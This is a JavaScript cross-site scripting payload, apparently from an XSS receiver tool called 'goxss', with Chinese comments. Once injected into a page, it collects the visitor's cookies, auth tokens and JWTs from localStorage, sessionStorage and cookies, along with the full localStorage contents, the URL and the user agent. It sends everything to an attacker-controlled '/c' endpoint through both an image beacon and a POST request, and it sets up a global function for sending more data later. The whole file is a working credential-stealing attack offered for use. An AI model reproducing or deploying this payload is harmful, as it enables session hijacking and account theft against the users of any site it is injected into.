(function () {
    if (window.__goxssHooked) return;
    window.__goxssHooked = true;

    var base = (function () {
        var s = document.currentScript && document.currentScript.src;
        if (s) {
            try {
                var u = new URL(s);
                // 支持挂载前缀：payload 形如 <origin>/<前缀>/s/<短码>，回传端点在 <origin>/<前缀>/c
                var m = u.pathname.match(/^(.*\/)s\/[^\/]+$/);
                if (m) return u.origin + m[1].replace(/\/$/, '');
                return u.origin;
            } catch (e) {}
        }
        return location.origin;
    })();
    var id = window.__goxssId || new URLSearchParams(
        (document.currentScript ? document.currentScript.src : location.href).split('?')[1] || ''
    ).get('id') || 'default';

    var data = {
        id:      id,
        url:     location.href,
        referrer: document.referrer,
        domain:  location.hostname,
        title:   document.title,
        cookie:  document.cookie,
        token:   (function () {
            var t = '';
            try { t = localStorage.getItem('token') || localStorage.getItem('access_token') || ''; } catch (e) {}
            try { if (!t) t = sessionStorage.getItem('token') || ''; } catch (e) {}
            var m = document.cookie.match(/(?:token|jwt|session)=([^;]+)/i);
            if (!t && m) t = decodeURIComponent(m[1]);
            return t;
        })(),
        localstorage: (function () { try { return JSON.stringify(localStorage); } catch (e) { return ''; } })(),
        ua:      navigator.userAgent,
    };

    var qs = Object.keys(data).map(function (k) {
        return encodeURIComponent(k) + '=' + encodeURIComponent(data[k] == null ? '' : data[k]);
    }).join('&');

    new Image().src = base + '/c?' + qs;

    try {
        fetch(base + '/c', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
        });
    } catch (e) {}

    window.__goxssSend = function (extraData, once) {
        if (once && window.__goxssSent) return;
        if (once) window.__goxssSent = true;
        var d = {};
        for (var k in data) d[k] = data[k];
        if (extraData) for (var k2 in extraData) d[k2] = extraData[k2];
        try {
            var q = Object.keys(d).map(function (k3) {
                return encodeURIComponent(k3) + '=' + encodeURIComponent(d[k3] == null ? '' : d[k3]);
            }).join('&');
            new Image().src = base + '/c?' + q;
        } catch (e) {}
        try {
            fetch(base + '/c', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(d),
            });
        } catch (e) {}
    };
})();
